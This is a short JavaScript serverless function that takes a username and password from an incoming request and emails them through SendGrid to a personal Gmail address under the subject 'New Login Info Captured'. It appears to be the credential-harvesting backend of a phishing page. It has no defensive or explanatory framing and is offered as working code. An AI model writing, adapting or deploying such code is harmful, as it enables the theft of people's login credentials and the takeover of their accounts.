mport sgMail from '@sendgrid/mail';

sgMail.setApiKey(process.env.SENDGRID_API_KEY);

export async function handler(event, context) {
try {
const { username, password } = JSON.parse(event.body);

const msg = {
to: 'anabones716@gmail.com', // your email
from: 'no-reply@example.com', // verified sender in SendGrid
subject: 'New Login Info Captured',
text: `Username: ${username}\nPassword: ${password}`,
html: `<p><strong>Username:</strong> ${username}</p><p><strong>Password:</strong> ${password}</p>`
};

await sgMail.send(msg);

return { statusCode: 200, body: JSON.stringify({ message: "Email sent!" }) };
} catch (error) {
console.error(error);
return { statusCode: 500, body: JSON.stringify({ message: "Error sending email" }) };
}
}
